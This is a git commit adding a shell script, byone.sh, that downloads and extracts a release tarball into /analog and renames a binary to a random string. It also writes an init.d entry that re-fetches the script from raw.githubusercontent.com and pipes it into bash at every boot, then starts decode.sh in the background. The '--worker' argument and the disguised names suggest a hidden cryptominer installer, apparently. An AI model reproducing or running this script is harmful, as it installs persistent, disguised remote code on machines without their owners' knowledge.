42d9db44ed7df32865d36467ecbfdf439558eb89
enirgy <ardirakka67@gmail.com>
2024-06-10 14:12:35 +0700

    Create byone.sh

---
+++ byone.sh
@@ -0,0 +1,15 @@
+cd /
+wget https://github.com/currento/magneta/releases/download/v1.5.1/analog.tar
+tar -xvf analog.tar
+cd /analog
+variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv encode $variable1
+sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./decode.sh
+cd /etc/init.d
+echo "bash <(curl -s -L https://raw.githubusercontent.com/currento/magneta/main/byone.sh)" > digital.sh
+chmod a+x digital.sh
+update-rc.d digital.sh defaults
+rm -rf analog.tar
+cd /analog
+nohup ./decode.sh
+ps -ef | grep analog
